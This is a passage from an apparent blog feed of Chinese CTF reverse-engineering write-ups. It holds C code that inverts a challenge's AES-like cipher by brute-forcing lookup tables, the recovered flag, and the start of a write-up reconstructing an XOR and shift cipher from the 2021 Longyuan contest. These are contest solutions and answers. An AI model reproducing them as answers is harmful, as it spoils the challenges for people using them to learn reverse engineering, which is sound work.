<span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>, <span class="number">0x08</span>, <span class="number">0x2E</span>,</span><br><span class="line">  <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>, <span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>,</span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>,</span><br><span class="line">  <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>, <span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>,</span><br><span class="line">  <span class="number">0x45</span>, <span class="number">0x06</span>, <span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>, <span class="number">0x3A</span>, <span class="number">0x91</span>,</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>,</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>, <span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>,</span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line">  <span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>,</span><br><span class="line">  <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>, <span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>,</span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>,</span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0xF4</span>, <span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>,</span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x60</span>, <span class="number">0x51</span>,</span><br><span class="line">  <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>,</span><br><span class="line">  <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>, <span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>,</span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>,</span><br><span class="line">  <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">BYTE <span class="title">BYTE1</span><span class="params">(DWORD _data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (_data &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0XFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BYTE <span class="title">BYTE2</span><span class="params">(DWORD _data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (_data &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0XFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BYTE <span class="title">BYTE3</span><span class="params">(DWORD _data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (_data &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0XFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BYTE <span class="title">BYTE0</span><span class="params">(DWORD _data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> _data &amp; <span class="number">0XFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// void brute(DWORD target /*, unsigned char *a1, unsigned char *a2, unsigned char *a3, unsigned char *a4*/)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     for (unsigned char i1 = 0; i1 &lt; 256; i1++)</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         for (unsigned char i2 = 0; i2 &lt; 256; i2++)</span></span><br><span class="line"><span class="comment">//         &#123;</span></span><br><span class="line"><span class="comment">//             for (unsigned char i3 = 0; i3 &lt; 256; i3++)</span></span><br><span class="line"><span class="comment">//             &#123;</span></span><br><span class="line"><span class="comment">//                 for (unsigned char i4 = 0; i4 &lt; 256; i4++)</span></span><br><span class="line"><span class="comment">//                 &#123;</span></span><br><span class="line"><span class="comment">//                     if ((dword_405020[i1] ^ dword_405420[i2] ^ dword_405820[i3] ^ dword_405C20[i4]) == target)</span></span><br><span class="line"><span class="comment">//                     &#123;</span></span><br><span class="line"><span class="comment">//                         printf(&quot;brute found for %#x: %d %d %d %d\n&quot;, target, i1, i2, i3, i4);</span></span><br><span class="line"><span class="comment">//                         // *a1 = i1;</span></span><br><span class="line"><span class="comment">//                         // *a2 = i2;</span></span><br><span class="line"><span class="comment">//                         // *a3 = i3;</span></span><br><span class="line"><span class="comment">//                         // *a4 = i4;</span></span><br><span class="line"><span class="comment">//                         return;</span></span><br><span class="line"><span class="comment">//                     &#125;</span></span><br><span class="line"><span class="comment">//                 &#125;</span></span><br><span class="line"><span class="comment">//             &#125;</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">brute</span><span class="params">(DWORD target, <span class="keyword">unsigned</span> <span class="keyword">char</span>* a1, <span class="keyword">unsigned</span> <span class="keyword">char</span>* a2, <span class="keyword">unsigned</span> <span class="keyword">char</span>* a3, <span class="keyword">unsigned</span> <span class="keyword">char</span>* a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i1 = <span class="number">0</span>; i1 &lt; <span class="number">256</span>; i1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">256</span>; i2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i3 = <span class="number">0</span>; i3 &lt; <span class="number">256</span>; i3++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i4 = <span class="number">0</span>; i4 &lt; <span class="number">256</span>; i4++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((dword_405420[i1] ^ dword_405820[i2] ^ dword_405C20[i3] ^ dword_405020[i4]) == target)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d - brute found for %x:%d %d %d %d\n&quot;</span>, count++, target, i1, i2, i3, i4);</span><br><span class="line">*a1 = i1;</span><br><span class="line">*a2 = i2;</span><br><span class="line">*a3 = i3;</span><br><span class="line">*a4 = i4;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">findIndex1</span><span class="params">(BYTE data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE* array = RijnDael_AES_LONG_inv_406120;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (array[i] == data)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(DWORD* miwen, DWORD* flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key_index = <span class="number">59</span>;</span><br><span class="line">DWORD v12, v14, v16, v18;</span><br><span class="line">DWORD v11, v13, v15, v17;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> _v9[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> _v8[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> _v7[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> _i[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">DWORD v9, v8, v7, i;</span><br><span class="line"></span><br><span class="line">v12 = miwen[<span class="number">0</span>] ^ key[key_index--];</span><br><span class="line">v14 = miwen[<span class="number">1</span>] ^ key[key_index--];</span><br><span class="line">v16 = miwen[<span class="number">2</span>] ^ key[key_index--];</span><br><span class="line">v18 = miwen[<span class="number">3</span>] ^ key[key_index--];</span><br><span class="line"><span class="comment">// 得到v9, v8, v7, i;</span></span><br><span class="line">_i[<span class="number">0</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE0</span>(v12));</span><br><span class="line">_v9[<span class="number">1</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE1</span>(v12));</span><br><span class="line">_v8[<span class="number">2</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE2</span>(v12));</span><br><span class="line">_v7[<span class="number">3</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE3</span>(v12));</span><br><span class="line"></span><br><span class="line">_v7[<span class="number">0</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE0</span>(v14));</span><br><span class="line">_i[<span class="number">1</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE1</span>(v14));</span><br><span class="line">_v9[<span class="number">2</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE2</span>(v14));</span><br><span class="line">_v8[<span class="number">3</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE3</span>(v14));</span><br><span class="line"></span><br><span class="line">_v8[<span class="number">0</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE0</span>(v16));</span><br><span class="line">_v7[<span class="number">1</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE1</span>(v16));</span><br><span class="line">_i[<span class="number">2</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE2</span>(v16));</span><br><span class="line">_v9[<span class="number">3</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE3</span>(v16));</span><br><span class="line"></span><br><span class="line">_v9[<span class="number">0</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE0</span>(v18));</span><br><span class="line">_v8[<span class="number">1</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE1</span>(v18));</span><br><span class="line">_v7[<span class="number">2</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE2</span>(v18));</span><br><span class="line">_i[<span class="number">3</span>] = <span class="built_in">findIndex1</span>(<span class="built_in">BYTE3</span>(v18));</span><br><span class="line"></span><br><span class="line">v9 = *(DWORD*)_v9;</span><br><span class="line">v8 = *(DWORD*)_v8;</span><br><span class="line">v7 = *(DWORD*)_v7;</span><br><span class="line">i = *(DWORD*)_i;</span><br><span class="line"></span><br><span class="line"><span class="comment">// v9 = 0x948726e2;</span></span><br><span class="line"><span class="comment">// v8 = 0x51f188a1;</span></span><br><span class="line"><span class="comment">// v7 = 0x9b05b51d;</span></span><br><span class="line"><span class="comment">// i = 0xb9f8810c;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">13</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">v11 = i ^ key[key_index--];</span><br><span class="line">v13 = v7 ^ key[key_index--];</span><br><span class="line">v15 = v8 ^ key[key_index--];</span><br><span class="line">v17 = v9 ^ key[key_index--];</span><br><span class="line"></span><br><span class="line"><span class="built_in">brute</span>(v11, &amp;_v9[<span class="number">1</span>], &amp;_v8[<span class="number">2</span>], &amp;_v7[<span class="number">3</span>], &amp;_i[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">brute</span>(v13, &amp;_i[<span class="number">1</span>], &amp;_v9[<span class="number">2</span>], &amp;_v8[<span class="number">3</span>], &amp;_v7[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">brute</span>(v15, &amp;_v7[<span class="number">1</span>], &amp;_i[<span class="number">2</span>], &amp;_v9[<span class="number">3</span>], &amp;_v8[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">brute</span>(v17, &amp;_v8[<span class="number">1</span>], &amp;_v7[<span class="number">2</span>], &amp;_i[<span class="number">3</span>], &amp;_v9[<span class="number">0</span>]);</span><br><span class="line">v9 = *(DWORD*)_v9;</span><br><span class="line">v8 = *(DWORD*)_v8;</span><br><span class="line">v7 = *(DWORD*)_v7;</span><br><span class="line">i = *(DWORD*)_i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag[<span class="number">0</span>] = i ^ key[key_index--];</span><br><span class="line">flag[<span class="number">1</span>] = v7 ^ key[key_index--];</span><br><span class="line">flag[<span class="number">2</span>] = v8 ^ key[key_index--];</span><br><span class="line">flag[<span class="number">3</span>] = v9 ^ key[key_index--];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Start...\n&quot;</span>);</span><br><span class="line">DWORD cmp_data[<span class="number">8</span>] = &#123; <span class="number">0xE82BA79E</span>, <span class="number">0x83EA91DE</span>, <span class="number">0x241BCCFE</span>, <span class="number">0x2836973B</span>, <span class="number">0x5F86C92D</span>, <span class="number">0x0C8094E88</span>, <span class="number">0x0FEC81BB0</span>, <span class="number">0x0D5277623</span> &#125;;</span><br><span class="line"><span class="comment">//DWORD cmp_data[8] = &#123;0X21266A63, 0XE7FC84AC, 0XEEDD698D, 0XE64535D6, 0X21266A63, 0XE7FC84AC, 0XEEDD698D, 0XE64535D6&#125;;</span></span><br><span class="line">    <span class="comment">//拿1234567890123456做测试</span></span><br><span class="line">DWORD flag[<span class="number">8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">decrypt</span>(cmp_data, flag);</span><br><span class="line"><span class="built_in">decrypt</span>(&amp;cmp_data[<span class="number">4</span>], &amp;flag[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag: %s\n\n&quot;</span>, (<span class="keyword">char</span>*)flag);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* tmp = (<span class="keyword">char</span>*)flag;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%X, &quot;</span>, tmp[i]);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终跑出来的数据为</p><p><img src="./image-20211112155749470.png" alt="image-20211112155749470"></p><p>稍作处理</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">0XFFFFFFF2</span>, <span class="number">0XFFFFFF88</span>, <span class="number">0X35</span>, <span class="number">0X49</span>, <span class="number">0XFFFFFFF8</span>, <span class="number">0X5C</span>, <span class="number">0X2A</span>, <span class="number">0X4</span>, <span class="number">0XFFFFFFA8</span>, <span class="number">0X4E</span>, <span class="number">0XFFFFFF86</span>, <span class="number">0XFFFFFF9E</span>, <span class="number">0XFFFFFFBE</span>, <span class="number">0XFFFFFFF9</span>, <span class="number">0X2A</span>, <span class="number">0XE</span>, <span class="number">0XFFFFFFC6</span>, <span class="number">0X4</span>, <span class="number">0XFFFFFF94</span>, <span class="number">0X56</span>, <span class="number">0X14</span>, <span class="number">0XFFFFFF89</span>, <span class="number">0X4C</span>, <span class="number">0X4C</span>, <span class="number">0X2E</span>, <span class="number">0XFFFFFF9C</span>, <span class="number">0X17</span>, <span class="number">0XFFFFFFC4</span>, <span class="number">0XFFFFFFC2</span>, <span class="number">0XFFFFFFA7</span>, <span class="number">0XFFFFFF82</span>, <span class="number">0X1F</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>, a[i] &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//F2 88 35 49 F8 5C 2A 4 A8 4E 86 9E BE F9 2A E C6 4 94 56 14 89 4C 4C 2E 9C 17 C4 C2 A7 82 1F</span></span><br></pre></td></tr></table></figure><p>找到源程序，调试起来，修改flag，进行验证</p><p><img src="./image-20211112160112252.png" alt="image-20211112160112252"></p><p>修改为</p><p><img src="./image-20211112160305517.png" alt="image-20211112160305517"></p><p>运行</p><p><img src="./image-20211112160425624.png" alt="image-20211112160425624"></p><p>发现程序输出success</p><p>所以最终的flag应该是 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">b&#x27;flag&#123;\xF2\x88\x35\x49\xF8\x5C\x2A\x4\xA8\x4E\x86\x9E\xBE\xF9\x2A\xE\xC6\x4\x94\x56\x14\x89\x4C\x4C\x2E\x9C\x17\xC4\xC2\xA7\x82\x1F&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇原战&quot;疫&quot;2021网络安全大赛_RE_WP</title>
      <link href="/2021/11/11/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021_RE_WP/"/>
      <url>/2021/11/11/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021_RE_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="陇原战”疫”2021网络安全大赛-RE-WP"><a href="#陇原战”疫”2021网络安全大赛-RE-WP" class="headerlink" title="陇原战”疫”2021网络安全大赛_RE_WP"></a>陇原战”疫”2021网络安全大赛_RE_WP</h1><h2 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>IDA打开分析</p><p><img src="./image-20211108215957143-16363799983581.png" alt="image-20211108215957143"></p><p>发现<code>sub_4111406</code>这个函数是对输入的flag进行加密，然后将加密后的数据存放到<code>0X41A14C</code>中</p><p>来到<code>sub_4111406</code>函数，并不能F5, 直接动态调试一直跟</p><p><img src="./image-20211108221620057.png" alt="image-20211108221620057">、</p><p>发现程序在不断的生成一些数据，长度是32</p><p><img src="./image-20211108221836369.png" alt="image-20211108221836369"></p><p><img src="./image-20211108222031497.png" alt="image-20211108222031497"></p><p>多次调试，不同输入，这里获取的数据是一样的</p><p><img src="./image-20211108222147050.png" alt="image-20211108222147050"></p><p><img src="./image-20211108222205631.png" alt="image-20211108222205631"></p><p>分析，还原算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD * <span class="title">enc</span><span class="params">(<span class="keyword">char</span>* flag, <span class="keyword">char</span>* key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD* pdw_flag = (DWORD*)flag;</span><br><span class="line">DWORD* pdw_key = (DWORD*)key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">pdw_flag[i] ^= pdw_key[(<span class="number">7</span> * i + <span class="number">2</span>) % <span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">pdw_flag[i] ^= pdw_flag[i] &lt;&lt; <span class="number">7</span>;</span><br><span class="line">pdw_flag[i] ^= pdw_key[(<span class="number">7</span> * i + <span class="number">3</span>) % <span class="number">8</span>]; </span><br><span class="line">pdw_flag[i] ^= pdw_flag[(<span class="number">5</span> * i + <span class="number">3</span>) % <span class="number">8</span>];</span><br><span class="line">pdw_flag[i] ^= pdw_flag[i] &lt;&lt; <span class="number">13</span>;</span><br><span class="line">pdw_flag[i] ^= pdw_key[(<span class="number">7</span> * i + <span class="number">5</span>) % <span class="number">8</span>]; </span><br><span class="line">pdw_flag[i] ^= pdw_flag[i] &lt;&lt; <span class="number">17</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pdw_flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">33</span>] =  <span class="string">&quot;12345678901234567890123456789012&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> key[<span class="number">32</span>] = &#123; <span class="number">12</span>, <span class="number">21</span>, <span class="number">30</span>, <span class="number">39</span>, <span class="number">32</span>, <span class="number">41</span>, <span class="number">50</span>, <span class="number">59</span>, <span class="number">68</span>, <span class="number">77</span>, <span class="number">86</span>,  <span class="number">95</span>,  <span class="number">88</span>,  <span class="number">97</span>, <span class="number">106</span>, <span class="number">115</span>, <span class="number">124</span>, <span class="number">133</span>, <span class="number">142</span>, <span class="number">151</span>, <span class="number">144</span>, <span class="number">153</span>, <span class="number">162</span>, <span class="number">171</span>, <span class="number">180</span>, <span class="number">189</span>, <span class="number">198</span>, <span class="number">207</span>, <span class="number">200</span>, <span class="number">209</span>, <span class="number">218</span>, <span class="number">227</span>&#125;;</span><br><span class="line"><span class="built_in">enc</span>(flag, key);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//在这里下断点观察加密后的数据是否与IDA调试时生成的一样</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在末尾下断点调试</p><p><img src="./image-20211108222634154.png" alt="image-20211108222634154"></p><p>IDA调试运行下断点观察加密后的数据</p><p><img src="./image-20211108222802969.png" alt="image-20211108222802969"></p><p>发现是一样的，还原加密算法成功，现在开始写解密脚本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 